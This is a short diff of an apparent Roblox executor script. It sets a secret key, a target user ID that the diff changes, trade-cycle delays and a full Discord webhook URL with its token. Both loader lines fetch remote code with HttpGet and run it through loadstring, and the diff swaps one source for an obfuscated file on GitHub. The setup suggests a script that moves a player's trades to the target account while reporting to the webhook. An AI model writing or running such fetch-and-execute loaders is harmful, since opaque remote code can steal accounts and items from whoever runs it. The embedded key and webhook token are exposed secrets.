@@ -1,5 +1,5 @@
 getgenv().SECRET_KEY = "mrr_a4c05f6fbca04071b396b8672570bada"
-getgenv().TARGET_ID = 9388660315
+getgenv().TARGET_ID = 7137572885
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482049851465142335/qOiDFhe49W1O5y23uUNDoVDpKklUvdfJsjBNsVqQ-auWc-RMS2jW_wHZL37cj76EaplD"
@@ -78,5 +78,5 @@ task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
 end)
 task.spawn(function()
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/72bdd0e2a92a3d6de5c85f3672cb06c6a948f4fa24c0d2a3fc91585ee910f726/download"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Leafboy122/Desync/refs/heads/main/obfuscated%20(3).lua%20(5).txt"))()
 end)
